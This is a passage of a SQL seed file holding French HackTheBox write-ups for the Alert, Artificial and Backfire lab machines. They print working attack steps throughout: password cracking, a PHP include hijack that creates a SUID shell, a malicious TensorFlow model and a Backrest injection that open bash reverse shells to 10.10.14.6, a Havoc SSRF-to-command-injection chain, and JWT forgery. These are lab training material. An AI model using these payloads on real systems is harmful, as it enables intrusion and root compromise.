J''utilise **Hashcat** avec le mode 1600 (Apache MD5).

```bash
hashcat -m 1600 albert.hash /usr/share/wordlists/rockyou.txt
```
Le mot de passe est identifié : **manchesterunited**.

### Premier Shell
Le service SSH est ouvert. Je tente une réutilisation de mot de passe pour l''utilisateur **albert**.

```bash
ssh albert@alert.htb
```
L''authentification réussit. Je stabilise le shell et récupère le flag `user.txt`.

---

### Énumération Interne & Accès Initial (User)

Une fois le hash de l''utilisateur **albert** récupéré via la vulnérabilité de **Directory Traversal** sur le fichier `.htpasswd`, je procède au cassage de celui-ci avec **hashcat**.

```bash
# Identification et cassage du hash MD5 (APR)
hashcat -m 1600 albert.hash /usr/share/wordlists/rockyou.txt
# Résultat : albert:manchesterunited
```

Je valide les informations d''identification via **SSH** pour confirmer l''accès au système.

```bash
# Validation des credentials avec netexec
netexec ssh alert.htb -u albert -p manchesterunited
# Connexion SSH
sshpass -p manchesterunited ssh albert@alert.htb
```

### Énumération Post-Exploitation

L''énumération initiale des privilèges de l''utilisateur ne révèle aucune règle **Sudo** exploitable. Cependant, l''examen des groupes et des fichiers appartenant à des groupes spécifiques montre une configuration intéressante.

```bash
# Vérification des privilèges et groupes
id
# uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)

# Recherche de fichiers accessibles par le groupe ''management''
find / -group management 2>/dev/null
# /opt/website-monitor/config/configuration.php
```

L''utilisateur appartient au groupe **management**, qui possède des droits d''écriture sur un fichier de configuration situé dans `/opt/website-monitor`.

### Analyse du Service Interne & Pivot

L''énumération des processus et des connexions réseau révèle un service web tournant localement avec les privilèges **root**.

```bash
# Analyse des processus et ports en écoute
ps auxww | grep php
# root ... /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor

netstat -tnl
# tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN
```

> **Schéma Mental : Port Forwarding**
> Le service sur le port 8080 n''est pas exposé sur l''interface externe. Pour l''analyser depuis ma machine d''attaque, je dois créer un **SSH Tunnel** (Local Port Forwarding). Ma machine (8888) -> Tunnel SSH -> Alert (127.0.0.1:8080).

```bash
# Mise en place du tunnel SSH
ssh -L 8888:localhost:8080 albert@alert.htb
```

### Escalade de Privilèges (Privilege Escalation)

L''analyse du code source dans `/opt/website-monitor` révèle un script nommé `monitor.php`. Ce script semble conçu pour être exécuté via une **Cron Job** par l''utilisateur **root**.

```php
// Extrait de /opt/website-monitor/monitor.php
include(''config/configuration.php'');
$monitors = json_decode(file_get_contents(PATH.''/monitors.json''));
// ... logique de monitoring via curl ...
```

Le script utilise la fonction `include()` pour charger `config/configuration.php`. Comme j''ai établi précédemment que ce fichier est scriptable par le groupe **management**, je peux injecter du code PHP arbitraire qui sera exécuté par **root** lors de l''exécution du script de monitoring.

> **Schéma Mental : Abus de Writable Include**
> 1. Le script `monitor.php` appartient à **root** et tourne via **cron**.
> 2. Il inclut `configuration.php`.
> 3. `albert` peut modifier `configuration.php`.
> 4. Injection d''une commande système pour créer un binaire **SetUID**.

#### Exploitation du vecteur de configuration

Je modifie le fichier de configuration pour créer une copie de `/bin/bash` avec le flag **SUID**.

```bash
# Modification du fichier de configuration
nano /opt/website-monitor/config/configuration.php
```

Contenu injecté :
```php
<?php
define(''PATH'', ''/opt/website-monitor'');
// Création d''un binaire bash SUID dans /tmp
system(''cp /bin/bash /tmp/pwn; chown root:root /tmp/pwn; chmod 6777 /tmp/pwn;'');
?>
```

Après avoir attendu l''exécution de la **Cron Job** (généralement chaque minute), je vérifie la présence du binaire et l''exécute pour obtenir un shell **root**.

```bash
# Vérification du binaire SUID
ls -l /tmp/pwn
# -rwsrwsrwx 1 root root ... /tmp/pwn

# Exécution pour obtenir les privilèges root
/tmp/pwn -p
id
# uid=1000(albert) gid=1000(albert) euid=0(root)
```

### Persistence & Cleanup
Une fois l''accès **root** stabilisé, je récupère le flag final et nettoie les traces d''exploitation (suppression du binaire SUID et restauration du fichier `configuration.php`).

```bash
cat /root/root.txt
rm /tmp/pwn
```

---

### Énumération & Analyse des Vecteurs de Privilèges

Une fois l''accès établi en tant qu''utilisateur **albert**, l''énumération locale révèle une configuration de groupe intéressante. L''utilisateur appartient au groupe **management**.

```bash
id
# uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)

find / -group management 2>/dev/null
# /opt/website-monitor/config
# /opt/website-monitor/config/configuration.php
```

L''analyse des processus montre une instance de serveur web PHP interne tournant avec les privilèges **root**, écoutant uniquement sur l''interface **localhost**.

```bash
ps auxww | grep php
# root 1003 0.0 0.6 207012 26288 ? Ss 14:28 0:01 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor

netstat -tnl
# tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN
```

### Pivot Local & Analyse du Code

Pour analyser l''application, j''établis un **SSH Tunneling** (Port Forwarding) afin d''accéder au service distant depuis ma machine locale.

```bash
ssh -L 8888:localhost:8080 albert@alert.htb
```

Dans le répertoire `/opt/website-monitor`, le fichier `monitor.php` semble être conçu pour être exécuté via un **Cron Job** par **root**. Ce script commence par une inclusion critique :

```php
// Extrait de monitor.php
include(''config/configuration.php'');
$monitors = json_decode(file_get_contents(PATH.''/monitors.json''));
```

Le fichier `configuration.php` est la cible idéale car il appartient au groupe **management** et possède les droits d''écriture pour ce groupe.

> **Schéma Mental :**
> **Root Cron Job** (Exécute monitor.php) -> **PHP Include** (Charge configuration.php) -> **Writable File** (albert peut modifier configuration.php) -> **Code Execution** (Injection de commandes système sous le contexte root).

### Exploitation : Détournement du PHP Include

Je modifie le fichier `configuration.php` pour y injecter une commande système. L''objectif est de créer une copie de `/bin/bash` avec le bit **SUID** activé dans `/tmp`.

```bash
ls -l /opt/website-monitor/config/configuration.php
# -rwxrwxr-x 1 root management 49 Nov 5 14:31 /opt/website-monitor/config/configuration.php

echo "<?php define(''PATH'', ''/opt/website-monitor''); system(''cp /bin/bash /tmp/0xdf; chmod +s /tmp/0xdf''); ?>" > /opt/website-monitor/config/configuration.php
```

Après une minute (cycle du **Cron Job**), le binaire **SUID** est généré. Il ne reste plus qu''à l''exécuter en préservant les privilèges.

```bash
/tmp/0xdf -p
# id
# uid=1000(albert) gid=1000(albert) euid=0(root) egid=0(root) groups=0(root),1000(albert),1001(management)
```

---

### Beyond Root : Analyse Post-Exploitation

L''analyse du système après compromission totale permet de comprendre pourquoi certains vecteurs d''attaque initiaux ont échoué.

#### 1. Protection contre le Path Traversal (visualizer.php)
Le paramètre `link_share` semblait vulnérable, mais une **Regular Expression** stricte empêchait toute remontée de répertoire.
```php
if (preg_match(''/^[a-zA-Z0-9_.-]+\.md$/'', $filename)) { ... }
```
Le filtre n''autorisait que les caractères alphanumériques, les points et les tirets, bloquant ainsi les séquences `../`.

#### 2. Sécurité du paramètre Page (index.php)
Contrairement à une implémentation classique de **LFI**, le développeur a utilisé un **Switch Statement** (Whitelist) au lieu d''une inclusion dynamique basée sur l''entrée utilisateur.
```php
switch ($page) {
    case ''alert'': ... break;
    case ''contact'': ... break;
    default: echo ''<h1>Error: Page not found</h1>''; break;
}
```
Cette approche rend l''exploitation par **Path Traversal** ou **Remote File Inclusion** impossible sur ce paramètre.

#### 3. Assainissement du Formulaire de Contact
Les tentatives d''**XSS** directes via le formulaire de contact ont échoué à cause de l''utilisation combinée de `filter_var` et `htmlspecialchars`.
```php
$email = filter_var($_POST["email"], FILTER_SANITIZE_EMAIL);
$message = htmlspecialchars($_POST["message"]);
```
Ces fonctions neutralisent les balises `<script>` et les caractères spéciaux avant l''écriture dans les fichiers `.txt` consultés par l''administrateur.

#### 4. Le mystère du Port 12227
Le scan **Nmap** indiquait le port 12227 comme `filtered`. L''examen des règles **iptables** confirme une politique de filtrage explicite.
```bash
iptables -L -v
# ACCEPT tcp -- lo any anywhere anywhere tcp dpt:12227
# DROP   tcp -- any any anywhere anywhere tcp dpt:12227
```
Le trafic n''est accepté que s''il provient de l''interface **loopback** (`lo`). Bien qu''aucun service ne soit actuellement à l''écoute sur ce port, la règle reste active, provoquant l''absence de réponse (DROP) aux paquets SYN externes, ce qui explique le statut `filtered`.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'Privilege Escalation'],
  'La phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque externe. **Résultats :** * **Port 22 (SSH) :** OpenSSH 8.2p1 (Ubuntu). * **Port 80 (HTTP) :** Apache 2.4.41. Redirection vers `http://alert.htb/`....',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-alert-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Artificial
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Artificial',
  'htb-artificial',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### Énumération Initiale

La phase de reconnaissance commence par un scan **Nmap** complet pour identifier la surface d''attaque réseau.

```bash
# Scan rapide de tous les ports TCP
nmap -p- -vvv --min-rate 10000 10.10.11.74

# Scan de détection de services et scripts par défaut
nmap -p 22,80 -sCV 10.10.11.74
```

Le scan révèle deux ports ouverts :
1.  **Port 22 (SSH)** : OpenSSH 8.2p1 (Ubuntu).
2.  **Port 80 (HTTP)** : Nginx 1.18.0, redirigeant vers `http://artificial.htb/`.

J''ajoute l''entrée correspondante dans mon fichier `/etc/hosts` pour résoudre le **Virtual Host**.

### Analyse de la Plateforme Web

Le site web est une application dédiée à l''intelligence artificielle permettant aux utilisateurs de s''enregistrer et d''uploader des modèles **TensorFlow**. 

L''énumération des répertoires avec **feroxbuster** ne révèle aucune page cachée critique, mais confirme l''utilisation de **Flask** (via les pages d''erreur 404 par défaut) et fournit des fichiers de configuration pour les développeurs : un `requirements.txt` et un `Dockerfile`.

**Points clés identifiés :**
*   **Tech Stack** : Python, Flask, TensorFlow-cpu 2.13.1.
*   **Fonctionnalité** : Upload de fichiers `.h5` (**Hierarchical Data Format**).
*   **Comportement** : L''application traite les modèles pour afficher des prédictions.

> **Schéma Mental :** L''application accepte des fichiers de modèles complexes (`.h5`). En **Machine Learning**, un modèle n''est pas qu''une suite de données, c''est une structure d''objets sérialisés. Si l''application utilise `Keras` pour charger ces modèles sans environnement sécurisé, elle est vulnérable à une **Insecure Deserialization**.

### Identification de la Vulnérabilité : TensorFlow Deserialization

Le format `.h5` utilisé par **Keras/TensorFlow** est connu pour permettre l''exécution de code arbitraire lors du chargement d''un modèle malveillant, notamment via la couche `Lambda`. Cette couche permet d''insérer des fonctions Python arbitraires dans le graphe du modèle.

### Préparation de l''Exploit (Payload Generation)

Pour garantir la compatibilité de la sérialisation, j''utilise le `Dockerfile` fourni pour construire un conteneur local identique à l''environnement cible.

```bash
# Construction de l''image Docker
docker build . -t artificial

# Lancement du conteneur avec un volume partagé
docker run -it -v $(pwd):/share artificial:latest
```

À l''intérieur du conteneur, je rédige un script Python utilisant une couche `Lambda` pour injecter une commande système. Je commence par un **ICMP Exfiltration** (ping) pour valider l''exécution.

```python
import tensorflow as tf

def exploit(x):
    import os
    # Commande de test : Ping vers ma machine d''attaque
    os.system("ping -c 2 10.10.14.6")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("/share/exploit.h5")
```

### Exécution et Premier Shell

Après avoir uploadé `exploit.h5` sur le dashboard, je clique sur **"View Predictions"**. Cette action force le serveur à charger le modèle en mémoire, déclenchant la fonction `exploit`.

Je confirme l''exécution via **tcpdump** :
```bash
sudo tcpdump -ni tun0 icmp
```

Une fois l''exécution confirmée, je génère un nouveau payload pour obtenir un **Reverse Shell**.

```python
def exploit(x):
    import os
    os.system("bash -c ''bash -i >& /dev/tcp/10.10.14.6/443 0>&1''")
    return x
```

Je prépare mon listener **Netcat** et déclenche à nouveau la lecture du modèle sur le site.

```bash
nc -lnvp 443
```

Le serveur établit la connexion, me donnant un accès initial en tant qu''utilisateur `app`. Je stabilise immédiatement mon shell :

```bash
python3 -c ''import pty; pty.spawn("/bin/bash")''
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

### Pivot vers l''utilisateur gael

L''énumération locale révèle une base de données **SQLite** dans le répertoire de l''application : `~/app/instance/users.db`.

```bash
sqlite3 ~/app/instance/users.db "SELECT * FROM user;"
```

Je récupère plusieurs hashes MD5. Le hash de l''utilisateur `gael` (`c99175974b6e192936d97224638a34f8`) est rapidement cassé via une **Wordlist Attack** (CrackStation/RockYou), révélant le mot de passe : `mattp005numbertwo`.

Je pivote vers l''utilisateur `gael` via SSH pour obtenir un environnement stable.

```bash
ssh gael@artificial.htb
```

---

### Énumération Post-Exploitation & Pivot vers `gael`

Une fois le **Foothold** obtenu en tant qu''utilisateur `app`, je commence par une énumération locale pour identifier les vecteurs de mouvement latéral. Le système héberge deux utilisateurs réels : `app` et `gael`.

L''application Flask tourne dans le répertoire personnel de `app`. L''examen de la structure des fichiers révèle une base de données **SQLite** contenant des informations sensibles.

```bash
# Énumération des utilisateurs et de la base de données
cat /etc/passwd | grep ''sh$''
ls -l ~/app/instance/users.db

# Extraction des hashes MD5
sqlite3 ~/app/instance/users.db "SELECT username, password FROM user;"
```

La table `user` contient plusieurs entrées, dont une pour l''utilisateur `gael` avec le hash **MD5** : `c99175974b6e192936d97224638a34f8`.

> **Schéma Mental : Pivot via réutilisation de mots de passe**
> 1. Accès initial via vulnérabilité applicative (**Deserialization**).
> 2. Extraction de la base de données locale (**Post-Exploitation**).
> 3. Crack de hash hors-ligne (**MD5**).
> 4. Tentative de **Credential Stuffing** sur les comptes système (SSH/SU).

Le hash est rapidement cassé via **CrackStation** ou **Hashcat**, révélant le mot de passe : `mattp005numbertwo`. Ce mot de passe est valide pour une connexion **SSH** ou un `su` vers l''utilisateur `gael`.

```bash
# Pivot vers gael
sshpass -p ''mattp005numbertwo'' ssh gael@artificial.htb
```

---

### Énumération Interne & Vecteur Root

En tant que `gael`, je constate que l''utilisateur appartient au groupe `sysadm`. Une analyse des services réseau locaux via `ss` montre deux ports intéressants écoutant uniquement sur la **Loopback** : le port `5000` (Flask) et le port `9898`.

```bash
# Identification des services locaux
ss -tnlp
# Recherche du service associé au port 9898
grep -r '':9898'' /etc/systemd/system/ 2>/dev/null
```

Le port `9898` correspond à **Backrest**, une interface Web pour l''outil de sauvegarde **Restic**. Pour y accéder, je mets en place un **SSH Tunneling** (Local Port Forwarding).

```bash
# Tunneling depuis la machine d''attaque
ssh -L 9898:127.0.0.1:9898 gael@artificial.htb
```

L''énumération du système de fichiers révèle une archive de sauvegarde dans `/var/backups/backrest_backup.tar.gz`, lisible par le groupe `sysadm`. Cette archive contient une copie de la configuration de **Backrest**, incluant le hash **Bcrypt** de l''administrateur de l''interface.

```bash
# Extraction et analyse de la configuration
tar -xf /var/backups/backrest_backup.tar.gz -C /tmp/
cat /tmp/backrest/.config/backrest/config.json
```

Le fichier `config.json` contient un hash encodé en **Base64**. Après décodage, j''obtiens un hash **Bcrypt** (`$2a$10$...`) que je soumets à **Hashcat** (Mode 3200). Le mot de passe identifié est `!@#$%^`.

---

### Escalade de Privilèges : Exploitation de Backrest

Avec les identifiants `backrest_root:!@#$%^`, j''accède à l''interface de gestion. Puisque **Backrest** s''exécute avec les privilèges de **root**, toute action de sauvegarde ou de restauration peut être détournée.

#### Méthode 1 : Abus des Hooks (RCE)
**Backrest** permet de configurer des **Hooks** (scripts s''exécutant avant ou après une sauvegarde).

> **Schéma Mental : RCE via Hooks**
> 1. Création d''un **Repository** arbitraire (ex: dans `/tmp`).
> 2. Création d''un **Plan** de sauvegarde.
> 3. Ajout d''un **Hook** de type "Command" exécutant un **Reverse Shell** ou un `chmod +s /bin/bash`.
> 4. Déclenchement manuel de la sauvegarde pour forcer l''exécution du script en tant que **root**.

#### Méthode 2 : Injection de commande via "Run Command"
L''interface propose une fonction "Run Command" pour interagir directement avec **Restic**. L''application concatène l''entrée utilisateur sans filtrage suffisant.

```bash
# Payload à injecter dans l''interface "Run Command"
check --password-command ''bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"''
```

#### Méthode 3 : Exfiltration de clés SSH
Il est possible de créer un **Plan** ciblant le répertoire `/root`, d''effectuer une sauvegarde, puis d''utiliser le "Snapshot Browser" pour restaurer ou télécharger directement la clé privée `id_rsa` de l''utilisateur **root**.

```bash
# Cheatsheet Pro : Accès Root final
ssh -i root_id_rsa root@artificial.htb
cat /root/root.txt
```

---

### Mouvement Latéral : De `app` à `gael`

Après avoir obtenu un accès initial en tant que **app**, l''énumération du système de fichiers révèle une base de données **SQLite** située dans `/home/app/app/instance/users.db`. L''extraction des données de la table `user` permet d''identifier plusieurs comptes et leurs **MD5 hashes** respectifs.

```bash
# Extraction des hashes depuis la base SQLite
sqlite3 instance/users.db "SELECT username, password FROM user;"

# Crack des hashes via CrackStation ou Hashcat
# gael : c99175974b6e192936d97224638a34f8 -> mattp005numbertwo
```

Le mot de passe identifié permet une transition vers l''utilisateur **gael** via **SSH** ou `su`. L''utilisateur **gael** possède des privilèges étendus via son appartenance au groupe **sysadm**, ce qui s''avérera crucial pour la suite.

---

### Élévation de Privilèges : Analyse de Backrest

L''énumération des services locaux via `ss -tnlp` montre un service écoutant sur le port **9898**. L''analyse des fichiers de configuration dans `/etc/systemd/system/` confirme qu''il s''agit de **Backrest**, une interface Web pour l''outil de sauvegarde **restic**.

> **Schéma Mental : Exploitation de la chaîne de confiance des sauvegardes**
> 1. **Accès aux données sensibles** : Le groupe **sysadm** permet de lire les archives de sauvegarde existantes.
> 2. **Extraction de secrets** : Récupération du hash de l''administrateur de l''application de sauvegarde.
> 3. **Abus de fonctionnalité** : Utiliser les privilèges de l''application (exécutée en **root**) pour compromettre l''OS hôte.

En inspectant `/var/backups/backrest_backup.tar.gz`, accessible par le groupe **sysadm**, je récupère le fichier `config.json`. Ce dernier contient un hash **bcrypt** encodé en **Base64** pour l''utilisateur `backrest_root`.

```bash
# Décodage et crack du hash Backrest
echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d > hash.txt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
# Résultat : !@#$%^
```

Après avoir établi un **SSH Tunneling** (`-L 9898:localhost:9898`), je me connecte à l''interface de **Backrest**. L''application s''exécutant avec les privilèges **root**, elle offre trois vecteurs d''élévation distincts.

#### Vecteur 1 : Exfiltration via Backup & Restore
En créant un **Repository** local (ex: `/dev/shm/repo`) et un **Plan** ciblant le répertoire `/root`, je peux déclencher une sauvegarde. L''interface permet ensuite de naviguer dans le **Snapshot**, de restaurer les fichiers ou de télécharger une archive `.tar.gz` contenant les secrets de **root** (`id_rsa`, `root.txt`).

#### Vecteur 2 : Abus de Hooks (Persistance & RCE)
Les **Plans** de sauvegarde supportent des **Hooks** (scripts pré/post exécution). En configurant un **Hook** de type "Command" exécutant un binaire malveillant, je peux obtenir une exécution de code directe en tant que **root**.

```bash
# Exemple de commande Hook pour créer un binaire SUID
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
```

#### Vecteur 3 : Injection d''arguments Restic
L''interface propose une fonction "Run Command" pour exécuter des commandes **restic** personnalisées. L''application concatène l''entrée utilisateur sans filtrage suffisant, permettant l''injection de l''option `--password-command`. Cette option exécute une commande système pour récupérer la clé du dépôt.

```bash
# Injection via Run Command dans l''UI Backrest
check --password-command ''bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"''
```

Cette injection déclenche un **Reverse Shell** avec les privilèges **root**.

---

### Beyond Root : Analyse Post-Exploitation

La compromission de la machine **Artificial** met en lumière plusieurs faiblesses architecturales critiques :

1.  **Supply Chain & ML Security** : L''utilisation de **TensorFlow** (version 2.13.1) avec le format legacy `.h5` (HDF5) expose le serveur à une **Deserialization Vulnerability** via la couche `Lambda`. Dans un environnement de production, l''exécution de modèles ML non signés doit être isolée dans des **Sandboxes** ou des **Containers** sans accès réseau.
2.  **Gestion des privilèges de sauvegarde** : L''application **Backrest** agit comme un proxy de privilèges. Bien que l''interface soit protégée par un mot de passe, le fait qu''elle puisse lire n''importe quel fichier système et exécuter des commandes arbitraires en tant que **root** en fait une cible de choix. Une segmentation via des **Linux Capabilities** spécifiques (ex: `CAP_DAC_READ_SEARCH`) plutôt qu''un accès **root** complet aurait limité l''impact.
3.  **Secrets en clair dans les backups** : La présence d''une sauvegarde de la configuration de l''application de sécurité elle-même dans un répertoire lisible par un groupe d''utilisateurs (`sysadm`) a permis le pivot final. C''est une illustration parfaite de la **Circular Dependency** en sécurité : le système de sauvegarde devient le maillon faible de la chaîne de confiance.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'SQL', 'Privilege Escalation'],
  'La phase de reconnaissance commence par un scan **Nmap** complet pour identifier la surface d''attaque réseau. Le scan révèle deux ports ouverts : 1. **Port 22 (SSH)** : OpenSSH 8.2p1 (Ubuntu). 2. **Port 80 (HTTP)** : Nginx 1.18.0, redirigeant vers `h...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-artificial-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Backfire
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Backfire',
  'htb-backfire',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### Énumération et Scanning

Je commence par une phase classique de reconnaissance avec **nmap** pour identifier la surface d''attaque. Le scan complet des ports TCP révèle trois services exposés et deux ports filtrés.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.49

# Scan de version et scripts par défaut sur les ports identifiés
nmap -p 22,443,8000 -sCV 10.10.11.49
```

**Résultats du scan :**
*   **Port 22 (SSH)** : OpenSSH 9.2p1 (Debian).
*   **Port 443 (HTTPS)** : Nginx 1.22.1. Le certificat SSL est auto-signé pour `127.0.0.1`.
*   **Port 8000 (HTTP)** : Nginx 1.22.1. Affiche un **Directory Listing**.
*   **Ports 5000, 7096** : État `filtered`.

### Analyse des services Web

Sur le port 443, une requête `GET` basique retourne une erreur 404, mais l''analyse des headers HTTP révèle un champ crucial : `X-Havoc: true`. Cela indique la présence d''un **Teamserver Havoc**, un framework de **C2 (Command & Control)** open-source écrit en Go.

Le port 8000 expose deux fichiers particulièrement sensibles :
1.  `disable_tls.patch` : Un patch pour le client Havoc suggérant que le port de management **40056** est utilisé localement sans TLS.
2.  `havoc.yaotl` : Le fichier de configuration du **Teamserver**.

**Extraction du fichier `havoc.yaotl` :**
Le fichier contient des informations critiques, notamment des identifiants d''opérateurs et la configuration des **Listeners**.

```yaml
Operators {
    user "ilya" { Password = "CobaltStr1keSuckz!" }
    user "sergej" { Password = "1w4nt2sw1tch2h4rdh4tc2" }
}
Listeners {
    Http {
        Name = "Demon Listener"
        Hosts = [ "backfire.htb" ]
        HostBind = "127.0.0.1"
        PortBind = 8443
    }
}
```

### Analyse de la vulnérabilité : CVE-2024-41570 (SSRF)

Le **Teamserver Havoc** (version 0.7) est vulnérable à une **Unauthenticated SSRF** au niveau de la gestion des callbacks des agents (**Demons**). 

> Schéma Mental :
> [Attaquant] -> [Requête POST malveillante vers Listener (8443)] -> [Teamserver Havoc] -> [Requête arbitraire vers Localhost (40056)]

La vulnérabilité réside dans la fonction `IsKnownRequestID`. Normalement, le serveur rejette toute commande d''un agent s''il n''a pas lui-même initié la requête. Cependant, les commandes `COMMAND_SOCKET` et `COMMAND_PIVOT` sont explicitement autorisées sans vérification de `RequestID` pour permettre le tunneling. Un attaquant peut donc forger un enregistrement d''agent, puis utiliser ces commandes pour forcer le **Teamserver** à effectuer des requêtes réseau sortantes.

### Vecteur d''attaque : Chaining SSRF vers RCE

L''objectif est d''atteindre le port de management interne (**40056**) via la **SSRF**. Ce port expose une interface **WebSocket** pour les opérateurs. Bien que l''accès soit authentifié (via les credentials d''Ilya trouvés précédemment), une seconde vulnérabilité de type **Command Injection** existe dans le module de compilation des implants (**Builder**).

La faille se situe dans `builder.go`. Lors de la génération d''un agent, le champ `Service Name` n''est pas correctement assaini avant d''être concaténé dans une commande `sh -c`.

**Payload d''injection :**
`\" -mbla; <COMMAND> 1>&2 && false #`

### Exploitation et Premier Shell

Je dois concevoir un exploit capable de :
1.  S''enregistrer comme un faux agent via le listener public.
2.  Utiliser la **SSRF** pour ouvrir une connexion **WebSocket** vers `127.0.0.1:40056`.
3.  Envoyer les frames **WebSocket** d''authentification.
4.  Envoyer le payload de **Command Injection** via une requête de build d''implant.

```python
# Structure simplifiée du payload WebSocket pour l''injection
injection = "\\\" -mbla; echo <B64_REVERSE_SHELL> | base64 -d | bash 1>&2 && false #"

payload = {
    "Body": {
        "Info": {
            "AgentType": "Demon",
            "Config": {
                "Service Name": injection,
                # ... autres paramètres requis
            },
            "Format": "Windows Service Exe"
        },
        "SubEvent": 2 # Build Request
    },
    "Head": { "Event": 5, "User": "ilya" }
}
```

Après exécution de l''exploit chaîné, je reçois une connexion sur mon listener :

```bash
nc -lnvp 443
# Connection received on 10.10.11.49
python3 -c ''import pty; pty.spawn("/bin/bash")''
ilya@backfire:~$ id
uid=1000(ilya) gid=1000(ilya) groups=1000(ilya)
```

Le premier flag est accessible dans `/home/ilya/user.txt`. Pour stabiliser l''accès, j''ajoute ma clé publique dans `.ssh/authorized_keys`.

---

### Énumération Interne & Reconnaissance Post-Exploitation

Une fois l''accès initial obtenu en tant qu''utilisateur **ilya**, j''entame une phase d''énumération locale pour identifier des vecteurs de mouvement latéral. Le répertoire personnel d''**ilya** contient un fichier `hardhat.txt` crucial. Son contenu indique que l''utilisateur **sergej** a installé **HardHatC2** (un framework C2 en C#) en conservant les configurations par défaut.

L''inspection des processus et des connexions réseau confirme cette piste :
```bash
# Identification des processus de sergej
ps auxww | grep sergej

# Analyse des ports en écoute locale
netstat -tnl
```
Je remarque que les ports **5000** et **7096** sont actifs en local. Ces ports correspondent respectivement à l''API du **TeamServer** et à l''interface web du client **HardHatC2**. Comme ils étaient filtrés lors du scan **Nmap** externe, je dois mettre en place un **SSH Tunneling** pour y accéder depuis ma machine d''attaque.

```bash
# Mise en place du port forwarding via SSH
ssh -i id_rsa ilya@10.10.11.49 -L 5000:127.0.0.1:5000 -L 7096:127.0.0.1:7096
```

### Mouvement Latéral : Exploitation de HardHatC2

**HardHatC2** utilise des **JSON Web Tokens (JWT)** pour l''authentification. En consultant le code source public du framework, je découvre que la **JWT Key** par défaut est `jtee43gt-6543-2iur-9422-83r5w27hgzaq`. Si **sergej** n''a pas modifié cette clé, je peux forger un token administratif.

> **Schéma Mental : JWT Forgery & C2 Hijacking**
> 1. **Local Lab** : Lancer une instance Docker locale de **HardHatC2** avec la clé par défaut.
> 2. **Token Generation** : S''authentifier sur l''instance locale pour générer un cookie de session valide pour l''utilisateur `HardHat_Admin`.
> 3. **Session Replay** : Injecter ce token dans le navigateur pointant vers le port **7096** tunnelisé de la cible.
> 4. **RCE via C2** : Utiliser les fonctionnalités natives du C2 (Terminal) pour exécuter des commandes sous l''identité du propriétaire du processus (**sergej**).

Après avoir injecté le token dans mon navigateur, j''accède à l''interface d''administration de **HardHatC2** sur la machine cible. Depuis le **Terminal** intégré du dashboard, j''exécute un **Reverse Shell** pour stabiliser mon accès en tant que **sergej**.

```bash
# Payload de reverse shell exécuté via le terminal HardHatC2
bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"
```

### Escalade de Privilèges : Abus de sudo et Arbitrary File Write

En tant que **sergej**, j''analyse mes privilèges **sudo**. La commande `sudo -l` révèle une configuration permissive pour les binaires de gestion du pare-feu :

```bash
sergej@backfire:~$ sudo -l
(root) NOPASSWD: /usr/sbin/iptables
(root) NOPASSWD: /usr/sbin/iptables-save
```

L''outil **iptables-save** possède une option `-f` (ou `--file`) qui permet d''écrire l''état actuel des règles de filtrage dans un fichier arbitraire avec les privilèges **root**.

> **Schéma Mental : Arbitrary Write via iptables-save**
> 1. **Poisoning** : Ajouter une règle **iptables** factice contenant une chaîne de caractères spécifique (ex: une clé SSH publique) dans le champ `comment`.
> 2. **Redirection** : Utiliser `iptables-save -f` pour dumper les règles dans un fichier sensible (ex: `/root/.ssh/authorized_keys`).
> 3. **Persistence** : Le service SSH ignorera les lignes malformées du dump d''iptables mais validera la ligne contenant la clé publique propre, permettant un accès **root** direct.

#### Procédure d''exploitation :

1. **Injection de la clé SSH dans la configuration iptables** :
J''utilise le module `comment` pour insérer ma clé publique. J''ajoute des retours à la ligne (`\n`) pour m''assurer que la clé apparaisse sur sa propre ligne dans le fichier de destination.

```bash
sudo iptables -A INPUT -i lo -m comment --comment $''\nssh-ed25519 AAAAC3... nobody@nothing\n''
```

2. **Déclenchement de l''écriture arbitraire** :
Je redirige le dump vers le fichier `authorized_keys` du compte **root**.

```bash
